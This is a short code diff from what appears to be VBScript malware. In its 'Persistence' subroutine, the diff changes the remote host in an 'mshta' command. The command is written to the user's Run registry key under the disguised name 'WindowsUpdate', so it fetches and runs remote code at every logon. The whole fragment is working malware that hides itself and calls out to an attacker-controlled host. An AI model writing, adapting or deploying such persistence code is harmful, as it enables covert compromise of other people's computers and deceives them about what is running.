@@ -200,7 +200,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dice-rigger.app"
+    Dim payload : payload = "mshta https://dicetrace.app"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
